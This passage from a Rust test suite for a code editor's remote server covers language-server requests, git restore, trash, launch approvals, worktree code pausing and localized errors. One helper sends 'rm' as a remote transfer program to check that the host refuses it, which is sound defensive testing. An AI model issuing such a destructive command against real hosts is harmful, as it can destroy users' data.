            FakeLspAdapter {
                name: "rust-analyzer",
                ..FakeLspAdapter::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities::default(),
            None,
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (_buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let fake_lsp = fake_lsp.next().await.unwrap();

    let shown_uri = lsp::Uri::from_file_path(path!("/code/project1/src/other.rs")).unwrap();
    let shown_selection = lsp::Range::new(lsp::Position::new(0, 3), lsp::Position::new(0, 6));
    let handled_requests = Arc::new(AtomicUsize::new(0));
    cx.update({
        let project = project.clone();
        let shown_uri = shown_uri.clone();
        let handled_requests = handled_requests.clone();
        move |cx| {
            cx.subscribe(&project, move |_, event, _| {
                if let project::Event::LanguageServerShowDocument(request) = event {
                    assert_eq!(request.uri, shown_uri);
                    assert_eq!(request.selection, Some(shown_selection));
                    assert_eq!((request.external, request.take_focus), (false, true));
                    // The client names the server when asking the user
                    // before opening an address.
                    assert_eq!(request.lsp_name, "rust-analyzer");
                    handled_requests.fetch_add(1, Ordering::Release);
                    request.clone().respond(true);
                }
            })
            .detach();
        }
    });

    let response = fake_lsp
        .request::<lsp::request::ShowDocument>(
            lsp::ShowDocumentParams {
                uri: shown_uri,
                external: None,
                take_focus: Some(true),
                selection: Some(shown_selection),
            },
            DEFAULT_LSP_REQUEST_TIMEOUT,
        )
        .await
        .into_response()
        .expect("show document request should not error");
    assert_eq!(response, lsp::ShowDocumentResult { success: true });
    assert_eq!(handled_requests.load(Ordering::Acquire), 1);
}

#[gpui::test]
async fn test_remote_execute_lsp_command(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            })
            .into(),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                ..FakeLspAdapter::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            lsp::ServerCapabilities {
                execute_command_provider: Some(lsp::ExecuteCommandOptions {
                    commands: vec!["the-command".to_string()],
                    ..lsp::ExecuteCommandOptions::default()
                }),
                ..lsp::ServerCapabilities::default()
            },
            Some(Box::new(|fake| {
                fake.set_request_handler::<lsp::request::ExecuteCommand, _, _>(
                    |params, _| async move {
                        assert_eq!(params.command, "the-command");
                        assert_eq!(params.arguments, vec![json!("foo"), json!(42)]);
                        Ok(Some(json!({"answer": 3})))
                    },
                );
            })),
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (_buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let _fake_lsp = fake_lsp.next().await.unwrap();

    let server_id = cx.read(|cx| {
        project
            .read(cx)
            .language_server_statuses(cx)
            .next()
            .expect("a language server should be running")
            .0
    });

    let result = project
        .update(cx, |project, cx| {
            project.lsp_store().update(cx, |lsp_store, cx| {
                lsp_store.execute_lsp_command(
                    server_id,
                    "the-command".to_string(),
                    vec![json!("foo"), json!(42)],
                    cx,
                )
            })
        })
        .await
        .expect("executing an advertised command should succeed");
    assert_eq!(result, Some(json!({"answer": 3})));

    let unadvertised = project
        .update(cx, |project, cx| {
            project.lsp_store().update(cx, |lsp_store, cx| {
                lsp_store.execute_lsp_command(
                    server_id,
                    "unadvertised-command".to_string(),
                    Vec::new(),
                    cx,
                )
            })
        })
        .await;
    assert_eq!(
        unadvertised
            .err()
            .map(|error| format!("{error:#}").contains("not advertised")),
        Some(true),
        "unadvertised commands should be rejected"
    );
}

#[gpui::test]
async fn test_remote_restore_unstaged_hunk_clears_diff(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(|cx| {
        let settings_store = SettingsStore::test(cx);
        cx.set_global(settings_store);
        theme_settings::init(theme::LoadThemes::JustBase, cx);
        release_channel::init(semver::Version::new(0, 0, 0), cx);
        editor::init(cx);
    });

    use editor::Editor;
    use gpui::VisualContext;

    let base_text = "
        fn one() -> usize {
            1
        }
    "
    .unindent();
    let modified_text = "
        fn one() -> usize {
            100
        }
    "
    .unindent();

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": modified_text
                },
            },
        }),
    )
    .await;
    fs.set_index_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", base_text.clone())],
    );
    fs.set_head_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", base_text.clone())],
        "deadbeef",
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let worktree_id = {
        let (worktree, _) = project
            .update(cx, |project, cx| {
                project.find_or_create_worktree(path!("/code/project1"), true, cx)
            })
            .await
            .unwrap();
        cx.update(|cx| worktree.read(cx).id())
    };
    cx.executor().run_until_parked();

    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    let cx = cx.add_empty_window();
    let editor = cx.new_window_entity(|window, cx| {
        Editor::for_buffer(buffer, Some(project.clone()), window, cx)
    });
    cx.executor().run_until_parked();

    editor.update_in(cx, |editor, window, cx| {
        let snapshot = editor.snapshot(window, cx);
        let hunks: Vec<_> = editor
            .diff_hunks_in_ranges(
                &[editor::Anchor::Min..editor::Anchor::Max],
                &snapshot.buffer_snapshot(),
            )
            .collect();
        assert!(!hunks.is_empty(), "should have diff hunks before restore");
    });

    cx.update_window_entity(&editor, |editor, window, cx| {
        editor.select_all(&editor::actions::SelectAll, window, cx);
        editor.git_restore(&git::Restore, window, cx);
    });
    cx.executor().run_until_parked();

    editor.update_in(cx, |editor, _window, cx| {
        let snapshot = editor.buffer().read(cx).snapshot(cx);
        assert_eq!(
            snapshot.text(),
            base_text,
            "buffer text should match base after restoring all hunks"
        );

        let hunks: Vec<_> = editor
            .diff_hunks_in_ranges(&[editor::Anchor::Min..editor::Anchor::Max], &snapshot)
            .collect();
        assert!(hunks.is_empty(), "should have no diff hunks after restore");
    });
}

#[gpui::test]
async fn test_remote_load_commit_template(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());

    fs.insert_tree(
        path!("/root"),
        json!({
            "project": {
                ".git": {},
                "README.md": "# Project's README"
            }
        }),
    )
    .await;

    fs.with_git_state(Path::new(path!("/root/project/.git")), false, |state| {
        state.commit_template = Some(GitCommitTemplate {
            template: "chore: commit template".to_string(),
        })
    })
    .expect("Should successfully update repository state");

    let (project, _) = init_test(&fs, cx, server_cx).await;
    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/root/project"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let repository = project.update(cx, |project, cx| project.active_repository(cx).unwrap());
    let commit_template = repository
        .update(cx, |repository, _| repository.load_commit_template_text())
        .await
        .unwrap()
        .unwrap()
        .expect("Loading commit template in remote should work");

    assert_eq!(commit_template.template, "chore: commit template");
}

#[gpui::test]
async fn test_remote_delete_project_entry_with_trash(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());

    fs.insert_tree(
        path!("/root"),
        json!({
            "zed": {
                "file_a.txt": "File A"
            }
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    let (worktree, _path) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/root/zed"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let entry_id = worktree.update(cx, |worktree, _cx| {
        worktree.entry_for_path(rel_path("file_a.txt")).unwrap().id
    });

    let remote_client = project.read_with(cx, |project, _cx| {
        project
            .remote_client()
            .expect("project should have a remote client")
    });

    let proto_client =
        remote_client.read_with(cx, |remote_client, _cx| remote_client.proto_client());

    proto_client
        .request(proto::DeleteProjectEntry {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            entry_id: entry_id.to_proto(),
            #[allow(deprecated)]
            use_trash: true,
        })
        .await
        .unwrap();

    assert_eq!(
        fs.trashed_paths(),
        vec![PathBuf::from(path!("/root/zed/file_a.txt"))]
    );
}

#[gpui::test]
async fn test_remote_trash_restore(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());

    fs.insert_tree(
        path!("/root"),
        json!({
            "zed": {
                "file_a.txt": "File A"
            }
        }),
    )
    .await;

    let (project, _headless_project) = init_test(&fs, cx, server_cx).await;
    let (worktree, _path) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/root/zed"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let worktree_id = worktree.update(cx, |worktree, _cx| worktree.id());
    let entry_id = worktree.update(cx, |worktree, _cx| {
        worktree.entry_for_path(rel_path("file_a.txt")).unwrap().id
    });

    let trash_id = project
        .update(cx, |project, cx| project.trash_entry(entry_id, cx))
        .unwrap()
        .await
        .unwrap();
    cx.run_until_parked();

    worktree.update(cx, |worktree, _cx| {
        assert!(worktree.entry_for_path(rel_path("file_a.txt")).is_none());
    });

    project
        .update(cx, |project, cx| {
            project.restore_entry(worktree_id, trash_id, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    worktree.update(cx, |worktree, _cx| {
        assert!(worktree.entry_for_path(rel_path("file_a.txt")).is_some());
    });
}

/// ADR-F50: the IDE says whether a remote worktree's own code may run, and
/// the remote host, which runs its language servers and formatters, follows.
#[gpui::test]
async fn test_the_ide_pauses_a_remote_worktrees_code_on_its_host(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    use project::worktree_code_execution::{RemoteHostPause, ResumeOutcome, WorktreeCodeState};

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({ "project1": { "src": { "lib.rs": "fn one() -> usize { 1 }" } } }),
    )
    .await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    server_cx.run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let host_state = |server_cx: &mut TestAppContext| {
        headless.read_with(server_cx, |headless, cx| {
            headless.worktree_code_execution.read(cx).state(worktree_id)
        })
    };
    assert_eq!(host_state(server_cx), WorktreeCodeState::Allowed);
    let execution = project.read_with(cx, |project, _| project.worktree_code_execution().clone());
    let host_follows = |cx: &mut TestAppContext| {
        execution.read_with(cx, |execution, _| {
            execution
                .details(worktree_id)
                .and_then(|details| details.remote_host)
        })
    };
    assert_eq!(host_follows(cx), Some(RemoteHostPause::Following));

    project
        .update(cx, |project, cx| {
            project.note_agent_write_to_path(Path::new(path!("/code/project1/src/lib.rs")), cx)
        })
        .await;
    cx.run_until_parked();
    server_cx.run_until_parked();
    assert_eq!(host_state(server_cx), WorktreeCodeState::Paused);

    let resumed = execution
        .update(cx, |execution, cx| {
            let generation = execution
                .generation(worktree_id)
                .expect("the worktree is known");
            execution.resume(worktree_id, generation, cx)
        })
        .await;
    assert_eq!(resumed, ResumeOutcome::Resumed);
    cx.run_until_parked();
    server_cx.run_until_parked();
    assert_eq!(host_state(server_cx), WorktreeCodeState::Allowed);
}

/// ADR-F50: a server from before the pause neither follows nor acknowledges
/// it. The IDE tells so rather than claim the host's code is paused, and a
/// worktree the IDE has not decided about runs nothing of its own there.
#[gpui::test]
async fn test_a_remote_server_that_does_not_acknowledge_the_pause_is_told_apart(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    use project::worktree_code_execution::{
        IgnoreWorktreeCodeExecutionForTests, REMOTE_ACKNOWLEDGEMENT_TIMEOUT, RemoteHostPause,
        WorktreeCodeState,
    };

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({ "project1": { "src": { "lib.rs": "fn one() -> usize { 1 }" } } }),
    )
    .await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    server_cx.update(|cx| cx.set_global(IgnoreWorktreeCodeExecutionForTests));
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    server_cx.run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    assert_eq!(
        headless.read_with(server_cx, |headless, cx| {
            headless.worktree_code_execution.read(cx).state(worktree_id)
        }),
        WorktreeCodeState::Unknown,
        "the host waits for the IDE's decision before running the worktree's code"
    );
    let execution = project.read_with(cx, |project, _| project.worktree_code_execution().clone());
    let host_follows = |cx: &mut TestAppContext| {
        execution.read_with(cx, |execution, _| {
            execution
                .details(worktree_id)
                .and_then(|details| details.remote_host)
        })
    };
    assert_eq!(host_follows(cx), Some(RemoteHostPause::Unknown));

    cx.executor().advance_clock(REMOTE_ACKNOWLEDGEMENT_TIMEOUT);
    cx.run_until_parked();
    assert_eq!(host_follows(cx), Some(RemoteHostPause::NotFollowing));
    let paused_on_host = execution.read_with(cx, |execution, _| {
        execution.formatters_skipped_since(worktree_id, 0)
    });
    assert!(!paused_on_host);
}

#[gpui::test]
async fn test_remote_project_creation_notifies_new_entity_observers(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let server_fs = Arc::new(FakeFs::new(server_cx.executor()));
    server_fs
        .insert_tree(
            path!("/project"),
            json!({
                "src": {
                    "main.rs": "fn main() {}",
                },
                "README.md": "# Test Project",
            }),
        )
        .await;

    let observer_invocations = Arc::new(AtomicUsize::new(0));
    cx.update(|cx| {
        let observer_invocations = observer_invocations.clone();
        cx.observe_new::<Project>(move |project, _window, cx| {
            let Some(client) = project.remote_client() else {
                return;
            };
            assert_eq!(
                client.read(cx).connection_state(),
                ConnectionState::Connected
            );
            observer_invocations.fetch_add(1, Ordering::SeqCst);
        })
        .detach();
    });

    let (project, _headless) = init_test(&server_fs, cx, server_cx).await;

    assert_eq!(
        observer_invocations.load(Ordering::SeqCst),
        1,
        "creating a remote project should notify new-entity observers with a connected remote client exactly once"
    );
    assert!(project.read_with(cx, |project, _| project.is_remote()));
}

#[gpui::test]
async fn test_log_store_keys_remote_events_by_primary_kind_on_supplementary_id_collision(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let server_fs = Arc::new(FakeFs::new(server_cx.executor()));
    server_fs
        .insert_tree(path!("/code"), json!({ "project1": { "README.md": "" } }))
        .await;
    let (project, _headless) = init_test(&server_fs, cx, server_cx).await;

    let log_store = cx.new(|cx| LogStore::new(false, cx));
    log_store.update(cx, |log_store, cx| log_store.add_project(&project, cx));

    // A supplementary server (e.g. Copilot) allocates its ID from the local
    // registry, which may collide numerically with a host-side server ID.
    let server_id = LanguageServerId(42);
    let supplementary_server_key = LanguageServerLogKey::new(
        LanguageServerKind::Supplementary {
            project: project.downgrade(),
        },
        server_id,
    );
    log_store.update(cx, |log_store, cx| {
        log_store.add_language_server(
            LanguageServerKind::Supplementary {
                project: project.downgrade(),
            },
            server_id,
            Some(LanguageServerName::new_static("copilot")),
            None,
            None,
            cx,
        );
    });

    project.update(cx, |_, cx| {
        cx.emit(project::Event::LanguageServerLog(
            server_id,
            LanguageServerLogType::Log(lsp::MessageType::LOG),
            "host server log".to_string(),
        ));
    });
    cx.run_until_parked();

    let remote_server_key = LanguageServerLogKey::new(
        LanguageServerKind::Remote {
            project: project.downgrade(),
        },
        server_id,
    );
    log_store.read_with(cx, |log_store, _| {
        assert_eq!(
            log_store.server_logs(&remote_server_key).map(|logs| {
                logs.iter()
                    .map(|log| log.as_ref().to_string())
                    .collect::<Vec<_>>()
            }),
            Some(vec!["host server log".to_string()]),
            "host server logs should be keyed by the remote server kind"
        );
        assert_eq!(
            log_store
                .server_logs(&supplementary_server_key)
                .map(|logs| logs.len()),
            Some(0),
            "host server logs should not leak into the supplementary server with the same ID"
        );
    });
}

/// What the remote host refuses a transfer program with, as the client got it.
async fn refused_transfer(project: &Entity<Project>, cx: &mut TestAppContext) -> String {
    let client = project.read_with(cx, |project, cx| {
        project
            .remote_client()
            .expect("a remote project")
            .read(cx)
            .proto_client()
    });
    let error = client
        .request(proto::RunTransferCommand {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            command_id: 1,
            program: "rm".to_string(),
            ..Default::default()
        })
        .await
        .expect_err("rm is not a transfer program");
    format!("{error:#}")
}

async fn refused_file_operation(project: &Entity<Project>, cx: &mut TestAppContext) -> String {
    let client = project.read_with(cx, |project, cx| {
        project
            .remote_client()
            .expect("a remote project")
            .read(cx)
            .proto_client()
    });
    let error = client
        .request(proto::TransferFileOperation {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            operation: None,
        })
        .await
        .expect_err("there is no operation");
    format!("{error:#}")
}

fn reconnect(project: &Entity<Project>, cx: &mut TestAppContext) {
    let remote_client = project
        .read_with(cx, |project, _| project.remote_client())
        .expect("a remote project");
    remote_client
        .update(cx, |remote_client, cx| {
            remote_client.simulate_disconnect(cx)
        })
        .detach();
    cx.run_until_parked();
    assert!(
        remote_client.read_with(cx, |remote_client, _| remote_client.connection_state())
            == ConnectionState::Connected,
        "the IDE reconnected"
    );
}

// ADR-F64: the remote host writes what it sends for the client's screen in
// the language the client names with the wire revision check. Client and
// host share this thread, whose catalog only the host's handler installs.
#[gpui::test]
async fn test_the_remote_host_writes_in_the_clients_display_language(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let _installs = i18n::test_support::ThreadLocalInstalls::new();
    server_cx.update(crate::display_language::init);
    cx.update(|cx| cx.set_global(remote::DisplayLanguageForTests(Some("ja".to_string()))));
    assert_eq!(i18n::current_locale(), "en");

    let (_fs, project, headless) =
        remote_project_with_language_server(json!({ "path": "project-lsp-binary" }), cx, server_cx)
            .await;
    assert_eq!(i18n::current_locale(), "ja");
    assert_eq!(
        refused_transfer(&project, cx).await,
        "RPC request RunTransferCommand failed: リモートでは rm を実行できません。"
    );
    assert_eq!(
        refused_file_operation(&project, cx).await,
        "RPC request TransferFileOperation failed: 操作が指定されていません"
    );

    // A language server the IDE did not allow: the reason is made on the
    // remote host and shown by the client.
    let reported = Rc::new(RefCell::new(Vec::new()));
    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    let _subscription = cx.update(|cx| {
        let reported = reported.clone();
        cx.subscribe(&lsp_store, move |_, event, _| {
            if let LspStoreEvent::LanguageServerUpdate {
                message:
                    proto::update_language_server::Variant::StatusUpdate(proto::StatusUpdate {
                        message: Some(message),
                        ..
                    }),
                ..
            } = event
            {
                reported.borrow_mut().push(message.clone());
            }
        })
    });
    let _fake_servers =
        register_fake_server_on_host(&host_languages(&headless, server_cx), PROJECT_SERVER);
    let (_buffer, _handle) =
        open_with_language_servers(&project, path!("/code/project1"), cx).await;
    let pending = pending_launches(cx);
    assert_eq!(pending.len(), 1, "{pending:?}");
    cx.update(ProjectLaunchApprovals::global)
        .update(cx, |approvals, cx| {
            approvals.deny_pending(&pending[0].key, cx)
        })
        .await
        .expect("the denial is stored");
    cx.run_until_parked();
    assert!(
        reported.borrow().iter().any(|message| message
            == "プロジェクトの設定にある言語サーバー「project_lsp」の実行ファイルは許可されていないため、起動しません"),
        "{:?}",
        reported.borrow()
    );

    // The user switched to English, which the host hears of on reconnecting.
    cx.update(|cx| cx.set_global(remote::DisplayLanguageForTests(Some("en".to_string()))));
    reconnect(&project, cx);
    assert_eq!(i18n::current_locale(), "en");
    assert_eq!(
        refused_transfer(&project, cx).await,
        "RPC request RunTransferCommand failed: rm cannot be run on the remote."
    );

    cx.update(|cx| cx.set_global(remote::DisplayLanguageForTests(Some("ja".to_string()))));
    reconnect(&project, cx);
    assert_eq!(
        refused_transfer(&project, cx).await,
        "RPC request RunTransferCommand failed: リモートでは rm を実行できません。"
    );
}

// A client from before the display language sends none, and gets English
// even from a host that last wrote Japanese for another client.
#[gpui::test]
async fn test_a_client_without_a_display_language_gets_english(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let _installs = i18n::test_support::ThreadLocalInstalls::new();
    server_cx.update(crate::display_language::init);
    crate::display_language::install(Some("ja"));
    cx.update(|cx| cx.set_global(remote::DisplayLanguageForTests(None)));

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(path!("/code"), json!({ "project1": {} }))
        .await;
    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    assert_eq!(i18n::current_locale(), "en");
    assert_eq!(
        refused_transfer(&project, cx).await,
        "RPC request RunTransferCommand failed: rm cannot be run on the remote."
    );
    assert_eq!(
        refused_file_operation(&project, cx).await,
        "RPC request TransferFileOperation failed: No operation was specified"
    );
}

// A host without the handler (a server that predates it) ignores the
// language and stays in English.
#[gpui::test]
async fn test_a_host_without_the_handler_ignores_the_display_language(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let _installs = i18n::test_support::ThreadLocalInstalls::new();
    cx.update(|cx| cx.set_global(remote::DisplayLanguageForTests(Some("ja".to_string()))));

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(path!("/code"), json!({ "project1": {} }))
        .await;
    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    assert_eq!(i18n::current_locale(), "en");
    assert_eq!(
        refused_transfer(&project, cx).await,
        "RPC request RunTransferCommand failed: rm cannot be run on the remote."
    );
}

pub async fn init_test(
    server_fs: &Arc<FakeFs>,
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) -> (Entity<Project>, Entity<HeadlessProject>) {
    init_test_with_fs(server_fs.clone(), cx, server_cx).await
}

/// [`init_test`] for a host whose file system is not a fake one — a test that
/// has the server touch real files.
pub async fn init_test_with_fs(
    server_fs: Arc<dyn Fs>,
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) -> (Entity<Project>, Entity<HeadlessProject>) {
    cx.update(|cx| {
        release_channel::init(semver::Version::new(0, 0, 0), cx);
    });
    server_cx.update(|cx| {
        release_channel::init(semver::Version::new(0, 0, 0), cx);
    });
    init_logger();

    let (opts, ssh_server_client, _) = RemoteClient::fake_server(cx, server_cx);
    let http_client = Arc::new(BlockedHttpClient);
    let node_runtime = NodeRuntime::unavailable();
    let languages = Arc::new(LanguageRegistry::new(cx.executor()));
    let proxy = Arc::new(ExtensionHostProxy::new());
    server_cx.update(HeadlessProject::init);
    let headless = server_cx.new(|cx| {
        HeadlessProject::new(
            crate::HeadlessAppState {
                session: ssh_server_client,
                fs: server_fs.clone(),
                http_client,
                node_runtime,
                languages,
                extension_host_proxy: proxy,
                startup_time: std::time::Instant::now(),
            },
            false,
            cx,
        )
    });

    let ssh = RemoteClient::connect_mock(opts, cx).await;
    let project = build_project(ssh, cx);
    project
        .update(cx, {
            let headless = headless.clone();
            |_, cx| cx.on_release(|_, _| drop(headless))
        })
        .detach();
    (project, headless)
}

fn init_logger() {
    zlog::init_test();
}

fn build_project(ssh: Entity<RemoteClient>, cx: &mut TestAppContext) -> Entity<Project> {
    cx.update(|cx| {
        if !cx.has_global::<SettingsStore>() {
            let settings_store = SettingsStore::test(cx);
            cx.set_global(settings_store);
        }
    });

    let client = fake_client(cx);
    cx.update(|cx| {
        Project::init(&client, cx);
    });

    connect_project(ssh, client, cx)
}

fn fake_client(cx: &mut TestAppContext) -> Arc<Client> {
    cx.update(|cx| {
        Client::new(
            Arc::new(FakeSystemClock::new()),
            FakeHttpClient::with_404_response(),
            cx,
        )
    })
}

/// A remote project over `ssh`, once `Project::init` has run for this app.
fn connect_project(
    ssh: Entity<RemoteClient>,
    client: Arc<Client>,
    cx: &mut TestAppContext,
) -> Entity<Project> {
    let node = NodeRuntime::unavailable();
    let user_store = cx.new(|cx| UserStore::new(client.clone(), cx));
    let languages = Arc::new(LanguageRegistry::test(cx.executor()));
    let fs = FakeFs::new(cx.executor());
    cx.update(|cx| Project::remote(ssh, client, node, user_store, languages, fs, false, cx))
}

const PROJECT_SERVER: &str = "project_lsp";
const MISSING_FORMATTER: &str = "zed-project-formatter-that-is-not-installed";

fn project_server_settings(binary: serde_json::Value) -> String {
    json!({
        "languages": { "Rust": { "language_servers": [PROJECT_SERVER] } },
        "lsp": { "project_lsp": { "binary": binary } },
    })
    .to_string()
}

async fn remote_tree(settings: String, server_cx: &mut TestAppContext) -> Arc<FakeFs> {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".zed": { "settings.json": settings },
                "scripts": { "lsp.js": "serve()" },
                "src": { "lib.rs": "fn one() -> usize { 1 }\n" },
            },
        }),
    )
    .await;
    fs
}

/// `/code/project1` on the remote host, whose own settings start
/// `project_lsp` from `binary` for its Rust file.
async fn remote_project_with_language_server(
    binary: serde_json::Value,
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) -> (Arc<FakeFs>, Entity<Project>, Entity<HeadlessProject>) {
    let fs = remote_tree(project_server_settings(binary), server_cx).await;
    cx.update(|cx| cx.set_global(db::AppDatabase::test_new()));
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    register_rust_on_client(&project, &[PROJECT_SERVER], cx);
    (fs, project, headless)
}

/// The client only needs the language and the adapters to pick which servers
/// the remote host runs.
fn register_rust_on_client(
    project: &Entity<Project>,
    names: &[&'static str],
    cx: &mut TestAppContext,
) {
    project.update(cx, |project, _| {
        let languages = project.languages();
        languages.register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        for name in names {
            languages.register_fake_lsp_adapter(
                "Rust",
                FakeLspAdapter {
                    name,
                    ..Default::default()
                },
            );
        }
    });
}

fn register_fake_server_on_host(
    languages: &Arc<LanguageRegistry>,
    name: &'static str,
) -> futures::channel::mpsc::UnboundedReceiver<lsp::FakeLanguageServer> {
    languages.register_fake_lsp_adapter(
        "Rust",
        FakeLspAdapter {
            name,
            ..Default::default()
        },
    );
    languages.register_fake_lsp_server(LanguageServerName(name.into()), Default::default(), None)
}

fn host_languages(
    headless: &Entity<HeadlessProject>,
    server_cx: &mut TestAppContext,
) -> Arc<LanguageRegistry> {
    server_cx.read(|cx| headless.read(cx).languages.clone())
}

async fn open_with_language_servers(
    project: &Entity<Project>,
    worktree_path: &str,
    cx: &mut TestAppContext,
) -> (Entity<Buffer>, OpenLspBufferHandle) {
    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(worktree_path, true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();
    let opened = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    opened
}

fn pending_launches(cx: &mut TestAppContext) -> Vec<LaunchApprovalDetails> {
    cx.update(|cx| {
        ProjectLaunchApprovals::global(cx)
            .read(cx)
            .pending_launches()
            .to_vec()
    })
}

fn runs_language_server(
    headless: &Entity<HeadlessProject>,
    name: &str,
    server_cx: &mut TestAppContext,
) -> bool {
    server_cx.read(|cx| {
        headless
            .read(cx)
            .lsp_store
            .read(cx)
            .language_server_statuses()
            .any(|(_, status)| &*status.name.0 == name)
    })
}

/// The last reason the remote host gave for not starting `name`.
fn last_failure(
    statuses: &mut futures::channel::mpsc::UnboundedReceiver<(
        Option<gpui::EntityId>,
        LanguageServerName,
        BinaryStatus,
    )>,
    name: &str,
) -> Option<String> {
    let mut failure = None;
    while let Ok((_, server, status)) = statuses.try_recv() {
        if &*server.0 == name
            && let BinaryStatus::Failed { error } = status
        {
            failure = Some(error);
        }
    }
    failure
}

/// The last status the remote host reported for `name`.
fn last_status(
    statuses: &mut futures::channel::mpsc::UnboundedReceiver<(
        Option<gpui::EntityId>,
        LanguageServerName,
        BinaryStatus,
    )>,
    name: &str,
) -> Option<BinaryStatus> {
    let mut last = None;
    while let Ok((_, server, status)) = statuses.try_recv() {
        if &*server.0 == name {
            last = Some(status);
        }
    }
    last
}

/// A session whose IDE predates ADR-F50: there is no project on the client
/// side, so nothing answers the remote server's questions.
async fn session_without_launch_approvals(
    fs: &Arc<FakeFs>,
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) -> (Entity<RemoteClient>, Entity<HeadlessProject>) {
    cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    server_cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
